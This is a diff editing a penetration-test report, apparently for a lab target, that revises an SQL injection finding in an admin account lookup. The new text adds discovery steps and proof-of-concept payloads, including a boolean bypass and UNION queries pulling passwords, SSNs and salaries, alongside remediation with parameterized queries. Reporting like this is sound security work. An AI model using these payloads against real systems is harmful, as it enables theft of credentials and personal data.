@@ -155,7 +155,7 @@ Confidential employee records exposed
 | F-01 | Stored Cross-Site Scripting (XSS) | High | `[7.1]` | A03 Injection | Client-side |
 | F-02 | Cross-Site Request Forgery (CSRF) on Password Change | High | `[8.1]` | A01 Broken Access Control | Client-side |
 | F-03 | Clickjacking — Missing Frame Protection | Medium | `[4.3]` | A01 Broken Access Control | Client-side |
-| F-04 | SQL Injection in Admin User Search | Critical | `[9.8]` | A03 Injection | Server-side |
+| F-04 | SQL Injection in Account Lookup | Critical | `[9.8]` | A03 Injection | Server-side |
 | F-05 | Insecure Direct Object Reference (IDOR) in HR Records | High | `[6.5]` | A01 Broken Access Control | Server-side |
 
 > Adjust CVSS scores after calculating with the [FIRST CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1).
@@ -252,10 +252,13 @@ Confidential employee records exposed
 
 ```python
 # Vulnerable
-query = f"SELECT * FROM users WHERE username = '{username}'"
+query = f"... FROM users WHERE username = '{username}'"
 
 # Fixed
-cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
+cursor.execute(
+    "SELECT id, username, role, email FROM users WHERE username = ?",
+    (username,),
+)
 ```
 
 #### References
@@ -405,7 +408,7 @@ add_header Content-Security-Policy "frame-ancestors 'none'" always;
 
 ---
 
-### F-04 — SQL Injection in Admin User Search
+### F-04 — SQL Injection in Account Lookup
 
 | Field | Value |
 |-------|-------|
@@ -417,53 +420,63 @@ add_header Content-Security-Policy "frame-ancestors 'none'" always;
 
 #### Description
 
-The `username` parameter in `/admin/search` is concatenated directly into a SQL query without sanitization or parameterization. An authenticated administrator (or an attacker with admin access) can extract arbitrary data from the database.
+The `username` parameter in `/admin/search` is concatenated directly into a SQL query without sanitization or parameterization. The UI presents a normal account lookup form with no visible SQL — injection must be discovered by testing the input field (WSTG-INPV-05). An attacker with admin access can extract arbitrary data from the database.
 
 #### Location
 
 - **Endpoint:** `GET /admin/search?username=`
-- **Vulnerable code pattern:** `f"SELECT * FROM users WHERE username = '{username}'"`
+- **Parameter:** `username`
+- **Vulnerable code pattern:** `f"... FROM users WHERE username = '{username}'"`
 
 #### How It Was Found
 
-1. Logged in as admin after account takeover
-2. Entered `admin' OR '1'='1` in the search field — all users returned (WSTG-INPV-05)
-3. Used UNION-based injection to extract `hr_records` table
+1. Logged in as admin after account takeover and opened **Account Lookup**
+2. Submitted `'` in the username field — application returned a generic error (syntax break)
+3. Submitted `admin' OR '1'='1'--` — all accounts returned in the results table
+4. Used UNION-based injection (4 columns) to extract passwords and `hr_records` data
 
 #### Proof of Concept
 
 **Boolean-based:**
 ```
-username=admin' OR '1'='1
+admin' OR '1'='1'--
 ```
 
-**UNION-based extraction:**
+**UNION — extract credentials** (passwords appear in the Role column):
 ```
-username=' UNION SELECT employee_id, salary, ssn, internal_notes, personal_address FROM hr_records--
+' UNION SELECT id, username, password, email FROM users--
+```
+
+**UNION — extract HR records:**
+```
+' UNION SELECT employee_id, salary, ssn, internal_notes FROM hr_records--
 ```
 
 ```http
-GET /admin/search?username=admin'%20OR%20'1'%3D'1 HTTP/1.1
+GET /admin/search?username=admin'%20OR%20'1'%3D'1'-- HTTP/1.1
 Host: [TARGET_VM_IP]
 Cookie: session=[SESSION]
 ```
 
-`[Screenshot: search results showing all users with plaintext passwords]`  
-`[Screenshot: UNION query extracting SSN and salary data]`
+`[Screenshot: Account Lookup results showing multiple users after OR injection]`  
+`[Screenshot: UNION query — anomalous values in Role/Email columns revealing SSN and salary]`
 
 #### Impact
 
-Full database read access — user credentials, salaries, SSNs, internal security notes. Potential stepping stone to write operations depending on DB permissions.
+Full database read access — user credentials, salaries, SSNs, internal security notes. The application does not display passwords in normal search results, but SQLi bypasses that UI restriction.
 
 #### Remediation
 
 ```python
-cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
+cursor.execute(
+    "SELECT id, username, role, email FROM users WHERE username = ?",
+    (username,),
+)
 ```
 
 - Use parameterized queries exclusively (ORM or prepared statements)
 - Apply least-privilege DB account (read-only if search only needs SELECT)
-- Never expose raw SQL or password fields in search results
+- Return generic errors to the client; log SQL errors server-side only
 
 ---
 
